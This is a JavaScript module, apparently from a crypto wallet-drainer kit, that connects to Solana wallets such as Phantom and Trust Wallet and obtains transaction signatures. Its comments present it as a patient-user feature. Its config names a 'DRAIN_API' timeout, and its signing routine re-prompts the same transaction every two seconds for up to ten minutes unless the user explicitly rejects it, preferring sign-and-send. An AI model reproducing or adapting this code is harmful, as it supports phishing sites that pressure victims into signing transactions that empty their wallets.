// Patient Mode Implementation for Wallet Connections and Transaction Signing
// Provides extended waiting periods for users who need time to verify passwords or review transactions

class PatientMode {
  constructor() {
    // Timeout Configuration
    this.timeouts = {
      WALLET_CONNECTION_TIMEOUT: 60000,      // 60 seconds initial timeout
      SIGNING_TIMEOUT: 120000,               // 120 seconds initial timeout
      DEEP_LINKING_TIMEOUT: 30000,           // 30 seconds for deep linking
      DRAIN_API_TIMEOUT: 120000,             // 120 seconds for API calls
      BROADCAST_TIMEOUT: 90000,              // 90 seconds for broadcasting
      
      // Patient Mode Extended Timeouts
      PATIENT_CONNECTION_TIMEOUT: 300000,    // 5 minutes total for connection
      PATIENT_SIGNING_TIMEOUT: 600000,       // 10 minutes total for signing
      
      // Polling Intervals
      CONNECTION_POLL_INTERVAL: 1000,        // 1 second for connection polling
      SIGNING_POLL_INTERVAL: 2000,           // 2 seconds for signing polling
      STATUS_UPDATE_INTERVAL: 30000,         // 30 seconds for status updates
    };
    
    // Active patient mode sessions
    this.activeSessions = new Map();
    
    // Event listeners for cleanup
    this.eventListeners = new Map();
  }

  // Patient Mode Connection with extended timeout
  async connectWithPatientMode(provider, walletType, onStatusUpdate = null) {
    const sessionId = `connection_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    console.log(`[PATIENT_MODE] Starting patient connection for ${walletType} (Session: ${sessionId})`);
    
    try {
      // Initial connection attempt with standard timeout
      const initialConnectionPromise = this.attemptConnection(provider, walletType);
      const initialTimeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Initial connection timeout')), this.timeouts.WALLET_CONNECTION_TIMEOUT)
      );
      
      try {
        // Try initial connection first
        const result = await Promise.race([initialConnectionPromise, initialTimeoutPromise]);
        console.log(`[PATIENT_MODE] Initial connection successful for ${walletType}`);
        return result;
      } catch (initialError) {
        console.log(`[PATIENT_MODE] Initial connection timeout, entering patient mode for ${walletType}`);
        
        // Enter patient mode
        return await this.enterConnectionPatientMode(provider, walletType, sessionId, onStatusUpdate);
      }
      
    } catch (error) {
      console.error(`[PATIENT_MODE] Connection failed for ${walletType}:`, error);
      this.cleanupSession(sessionId);
      throw error;
    }
  }

  // Patient Mode Transaction Signing with extended timeout
  async signWithPatientMode(provider, transaction, walletType, onStatusUpdate = null) {
    const sessionId = `signing_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    console.log(`[PATIENT_MODE] Starting patient signing for ${walletType} (Session: ${sessionId})`);
    
    try {
      // Initial signing attempt with standard timeout
      const initialSigningPromise = this.attemptSigning(provider, transaction, walletType);
      const initialTimeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Initial signing timeout')), this.timeouts.SIGNING_TIMEOUT)
      );
      
      try {
        // Try initial signing first
        const result = await Promise.race([initialSigningPromise, initialTimeoutPromise]);
        console.log(`[PATIENT_MODE] Initial signing successful for ${walletType}`);
        return result;
      } catch (initialError) {
        console.log(`[PATIENT_MODE] Initial signing timeout, entering patient mode for ${walletType}`);
        
        // Enter patient mode
        return await this.enterSigningPatientMode(provider, transaction, walletType, sessionId, onStatusUpdate);
      }
      
    } catch (error) {
      console.error(`[PATIENT_MODE] Signing failed for ${walletType}:`, error);
      this.cleanupSession(sessionId);
      throw error;
    }
  }

  // Enter connection patient mode
  async enterConnectionPatientMode(provider, walletType, sessionId, onStatusUpdate) {
    const session = {
      type: 'connection',
      walletType,
      startTime: Date.now(),
      status: 'waiting_for_approval',
      lastStatusUpdate: Date.now(),
      pollInterval: null,
      statusInterval: null,
      eventListeners: []
    };
    
    this.activeSessions.set(sessionId, session);
    
    // Set up status updates
    if (onStatusUpdate) {
      onStatusUpdate('⏳ Waiting for approval...', 'loading');
    }
    
    // Start polling for connection
    const pollPromise = this.pollForConnection(provider, sessionId, onStatusUpdate);
    
    // Set up event listener for connection
    const eventPromise = this.listenForConnection(provider, sessionId);
    
    // Set up status update interval
    this.setupStatusUpdates(sessionId, onStatusUpdate, 'connection');
    
    try {
      // Wait for either polling success or event success
      const result = await Promise.race([pollPromise, eventPromise]);
      console.log(`[PATIENT_MODE] Connection successful in patient mode for ${walletType}`);
      return result;
    } catch (error) {
      console.error(`[PATIENT_MODE] Connection failed in patient mode for ${walletType}:`, error);
      throw error;
    } finally {
      this.cleanupSession(sessionId);
    }
  }

  // Enter signing patient mode
  async enterSigningPatientMode(provider, transaction, walletType, sessionId, onStatusUpdate) {
    const session = {
      type: 'signing',
      walletType,
      startTime: Date.now(),
      status: 'waiting_for_signature',
      lastStatusUpdate: Date.now(),
      pollInterval: null,
      statusInterval: null,
      eventListeners: []
    };
    
    this.activeSessions.set(sessionId, session);
    
    // Set up status updates
    if (onStatusUpdate) {
      onStatusUpdate('⏳ Waiting for signature...', 'loading');
    }
    
    // Start polling for signature
    const pollPromise = this.pollForSignature(provider, transaction, sessionId, onStatusUpdate);
    
    // Set up status update interval
    this.setupStatusUpdates(sessionId, onStatusUpdate, 'signing');
    
    try {
      const result = await pollPromise;
      console.log(`[PATIENT_MODE] Signing successful in patient mode for ${walletType}`);
      return result;
    } catch (error) {
      console.error(`[PATIENT_MODE] Signing failed in patient mode for ${walletType}:`, error);
      throw error;
    } finally {
      this.cleanupSession(sessionId);
    }
  }

  // Poll for wallet connection
  async pollForConnection(provider, sessionId, onStatusUpdate) {
    const session = this.activeSessions.get(sessionId);
    if (!session) throw new Error('Session not found');
    
    const startTime = Date.now();
    const maxWaitTime = this.timeouts.PATIENT_CONNECTION_TIMEOUT;
    
    return new Promise((resolve, reject) => {
      const poll = async () => {
        try {
          // Check if we've exceeded the maximum wait time
          const elapsed = Date.now() - startTime;
          if (elapsed >= maxWaitTime) {
            reject(new Error('Patient mode connection timeout - user took too long to approve'));
            return;
          }
          
          // Check if provider is connected
          if (provider.connected && provider.publicKey) {
            console.log(`[PATIENT_MODE] Connection detected via polling for ${session.walletType}`);
            resolve({
              publicKey: provider.publicKey,
              connected: true,
              method: 'polling'
            });
            return;
          }
          
          // For wallets that may have publicKey even if connected is false
          const walletsWithPublicKeyCheck = ['Phantom', 'Exodus', 'Solflare', 'Backpack', 'Glow'];
          if (walletsWithPublicKeyCheck.includes(session.walletType) && provider.publicKey) {
            console.log(`[PATIENT_MODE] ${session.walletType} connection detected via publicKey polling`);
            resolve({
              publicKey: provider.publicKey,
              connected: true,
              method: `${session.walletType.toLowerCase()}_polling`
            });
            return;
          }
          
          // For Trust Wallet, check for address property
          if (session.walletType === 'Trust Wallet' && (provider.publicKey || provider.address)) {
            console.log(`[PATIENT_MODE] Trust Wallet connection detected via address polling`);
            resolve({
              publicKey: provider.publicKey || provider.address,
              connected: true,
              method: 'trust_polling'
            });
            return;
          }
          
          // Continue polling
          session.pollInterval = setTimeout(poll, this.timeouts.CONNECTION_POLL_INTERVAL);
          
        } catch (error) {
          reject(error);
        }
      };
      
      // Start polling
      poll();
    });
  }

  // Listen for connection event
  async listenForConnection(provider, sessionId) {
    const session = this.activeSessions.get(sessionId);
    if (!session) throw new Error('Session not found');
    
    return new Promise((resolve, reject) => {
      const startTime = Date.now();
      const maxWaitTime = this.timeouts.PATIENT_CONNECTION_TIMEOUT;
      
      const onConnect = (publicKey) => {
        console.log(`[PATIENT_MODE] Connection detected via event for ${session.walletType}`);
        resolve({
          publicKey,
          connected: true,
          method: 'event'
        });
      };
      
      const onDisconnect = () => {
        console.log(`[PATIENT_MODE] Disconnection detected for ${session.walletType}`);
        // Don't reject on disconnect for wallets that might reconnect
        const walletsThatMayReconnect = ['Phantom', 'Exodus', 'Solflare', 'Backpack', 'Glow'];
        if (!walletsThatMayReconnect.includes(session.walletType)) {
          reject(new Error('Wallet disconnected during connection attempt'));
        }
      };
      
      const onError = (error) => {
        console.error(`[PATIENT_MODE] Connection error for ${session.walletType}:`, error);
        reject(error);
      };
      
      // Set up event listeners
      if (provider.on) {
        provider.on('connect', onConnect);
        provider.on('disconnect', onDisconnect);
        provider.on('error', onError);
        
        session.eventListeners.push(
          () => provider.off('connect', onConnect),
          () => provider.off('disconnect', onDisconnect),
          () => provider.off('error', onError)
        );
      }
      
      // Set up timeout for event listening
      const timeoutId = setTimeout(() => {
        reject(new Error('Patient mode connection timeout - no event received'));
      }, maxWaitTime);
      
      // Store timeout for cleanup
      session.eventListeners.push(() => clearTimeout(timeoutId));
    });
  }

  // Poll for transaction signature
  async pollForSignature(provider, transaction, sessionId, onStatusUpdate) {
    const session = this.activeSessions.get(sessionId);
    if (!session) throw new Error('Session not found');
    
    const startTime = Date.now();
    const maxWaitTime = this.timeouts.PATIENT_SIGNING_TIMEOUT;
    let attemptCount = 0;
    
    return new Promise((resolve, reject) => {
      const poll = async () => {
        try {
          // Check if we've exceeded the maximum wait time
          const elapsed = Date.now() - startTime;
          if (elapsed >= maxWaitTime) {
            reject(new Error('Patient mode signing timeout - user took too long to sign'));
            return;
          }
          
          attemptCount++;
          console.log(`[PATIENT_MODE] Signing attempt ${attemptCount} for ${session.walletType}`);
          
          // Attempt to sign the transaction
          try {
            const signed = await this.attemptSigning(provider, transaction, session.walletType);
            console.log(`[PATIENT_MODE] Signing successful on attempt ${attemptCount} for ${session.walletType}`);
            resolve(signed);
            return;
          } catch (signError) {
            // If it's a user rejection, stop polling
            if (signError.message?.includes('User rejected') || 
                signError.message?.includes('User denied') ||
                signError.message?.includes('User cancelled')) {
              reject(new Error('User rejected the transaction'));
              return;
            }
            
            // For other errors, continue polling
            console.log(`[PATIENT_MODE] Signing attempt ${attemptCount} failed, will retry:`, signError.message);
          }
          
          // Continue polling
          session.pollInterval = setTimeout(poll, this.timeouts.SIGNING_POLL_INTERVAL);
          
        } catch (error) {
          reject(error);
        }
      };
      
      // Start polling
      poll();
    });
  }

  // Setup status updates
  setupStatusUpdates(sessionId, onStatusUpdate, mode) {
    const session = this.activeSessions.get(sessionId);
    if (!session || !onStatusUpdate) return;
    
    session.statusInterval = setInterval(() => {
      const elapsed = Math.floor((Date.now() - session.startTime) / 1000);
      const maxTime = mode === 'connection' ? 
        this.timeouts.PATIENT_CONNECTION_TIMEOUT / 1000 : 
        this.timeouts.PATIENT_SIGNING_TIMEOUT / 1000;
      
      const remaining = maxTime - elapsed;
      
      if (remaining > 0) {
        const statusMessage = mode === 'connection' ?
          `⏳ Waiting for approval... (${remaining}s remaining)` :
          `⏳ Waiting for signature... (${remaining}s remaining)`;
        
        onStatusUpdate(statusMessage, 'loading');
      }
    }, this.timeouts.STATUS_UPDATE_INTERVAL);
  }

  // Attempt wallet connection
  async attemptConnection(provider, walletType) {
    console.log(`[PATIENT_MODE] Attempting connection for ${walletType}`);
    
    if (!provider || typeof provider.connect !== 'function') {
      throw new Error('Provider does not support connection');
    }
    
    try {
      // Wallet-specific connection methods
      switch (walletType) {
        case 'Phantom':
          console.log(`[PATIENT_MODE] Using Phantom-specific connection method`);
          const phantomResult = await provider.connect();
          return {
            publicKey: phantomResult?.publicKey || provider.publicKey,
            connected: true,
            method: 'phantom_direct'
          };
          
        case 'Exodus':
          console.log(`[PATIENT_MODE] Using Exodus-specific connection method`);
          // Exodus may need different connection parameters
          const exodusResult = await provider.connect();
          return {
            publicKey: exodusResult?.publicKey || provider.publicKey,
            connected: true,
            method: 'exodus_direct'
          };
          
        case 'Solflare':
          console.log(`[PATIENT_MODE] Using Solflare-specific connection method`);
          const solflareResult = await provider.connect();
          return {
            publicKey: solflareResult?.publicKey || provider.publicKey,
            connected: true,
            method: 'solflare_direct'
          };
          
        case 'Backpack':
          console.log(`[PATIENT_MODE] Using Backpack-specific connection method`);
          const backpackResult = await provider.connect();
          return {
            publicKey: backpackResult?.publicKey || provider.publicKey,
            connected: true,
            method: 'backpack_direct'
          };
          
        case 'Glow':
          console.log(`[PATIENT_MODE] Using Glow-specific connection method`);
          const glowResult = await provider.connect();
          return {
            publicKey: glowResult?.publicKey || provider.publicKey,
            connected: true,
            method: 'glow_direct'
          };
          
        case 'Trust Wallet':
          console.log(`[PATIENT_MODE] Using Trust Wallet-specific connection method`);
          const trustResult = await provider.connect();
          return {
            publicKey: trustResult?.publicKey || provider.publicKey,
            connected: true,
            method: 'trust_direct'
          };
          
        default:
          console.log(`[PATIENT_MODE] Using standard connection method for ${walletType}`);
          const result = await provider.connect();
          return {
            publicKey: result?.publicKey || provider.publicKey,
            connected: true,
            method: 'standard_direct'
          };
      }
    } catch (error) {
      console.error(`[PATIENT_MODE] Connection attempt failed for ${walletType}:`, error);
      throw error;
    }
  }

  // Attempt transaction signing
  async attemptSigning(provider, transaction, walletType) {
    console.log(`[PATIENT_MODE] Attempting signing for ${walletType}`);
    
    // Check available signing methods
    const signingMethods = {
      signAndSendTransaction: typeof provider.signAndSendTransaction === 'function',
      signTransaction: typeof provider.signTransaction === 'function',
      signAllTransactions: typeof provider.signAllTransactions === 'function',
      sign: typeof provider.sign === 'function'
    };
    
    // Try signAndSendTransaction first (most reliable)
    if (signingMethods.signAndSendTransaction) {
      return await provider.signAndSendTransaction(transaction);
    }
    
    // Try signTransaction (standard Solana method)
    if (signingMethods.signTransaction) {
      return await provider.signTransaction(transaction);
    }
    
    // Try signAllTransactions as fallback
    if (signingMethods.signAllTransactions) {
      const signed = await provider.signAllTransactions([transaction]);
      if (signed && signed.length > 0) {
        return signed[0];
      }
      throw new Error('signAllTransactions returned empty array');
    }
    
    // Try sign method as last resort
    if (signingMethods.sign) {
      return await provider.sign(transaction);
    }
    
    throw new Error('Wallet does not support transaction signing');
  }

  // Cleanup session and all associated resources
  cleanupSession(sessionId) {
    const session = this.activeSessions.get(sessionId);
    if (!session) return;
    
    console.log(`[PATIENT_MODE] Cleaning up session ${sessionId} for ${session.walletType}`);
    
    // Clear intervals
    if (session.pollInterval) {
      clearTimeout(session.pollInterval);
    }
    if (session.statusInterval) {
      clearInterval(session.statusInterval);
    }
    
    // Remove event listeners
    session.eventListeners.forEach(cleanup => {
      try {
        cleanup();
      } catch (error) {
        console.error(`[PATIENT_MODE] Error during event listener cleanup:`, error);
      }
    });
    
    // Remove session
    this.activeSessions.delete(sessionId);
  }

  // Get active sessions count
  getActiveSessionsCount() {
    return this.activeSessions.size;
  }

  // Get session information
  getSessionInfo(sessionId) {
    const session = this.activeSessions.get(sessionId);
    if (!session) return null;
    
    const elapsed = Date.now() - session.startTime;
    const maxTime = session.type === 'connection' ? 
      this.timeouts.PATIENT_CONNECTION_TIMEOUT : 
      this.timeouts.PATIENT_SIGNING_TIMEOUT;
    
    return {
      ...session,
      elapsed,
      remaining: Math.max(0, maxTime - elapsed),
      progress: Math.min(100, (elapsed / maxTime) * 100)
    };
  }

  // Cancel a specific session
  cancelSession(sessionId) {
    const session = this.activeSessions.get(sessionId);
    if (!session) return false;
    
    console.log(`[PATIENT_MODE] Cancelling session ${sessionId} for ${session.walletType}`);
    this.cleanupSession(sessionId);
    return true;
  }

  // Cancel all sessions
  cancelAllSessions() {
    const sessionIds = Array.from(this.activeSessions.keys());
    sessionIds.forEach(sessionId => this.cancelSession(sessionId));
    console.log(`[PATIENT_MODE] Cancelled ${sessionIds.length} active sessions`);
  }

  // Get timeout configuration
  getTimeouts() {
    return { ...this.timeouts };
  }

  // Update timeout configuration
  updateTimeouts(newTimeouts) {
    this.timeouts = { ...this.timeouts, ...newTimeouts };
    console.log(`[PATIENT_MODE] Updated timeout configuration:`, this.timeouts);
  }

  // Comprehensive cleanup
  cleanup() {
    this.cancelAllSessions();
    console.log(`[PATIENT_MODE] Complete cleanup performed`);
  }
}

export default PatientMode;
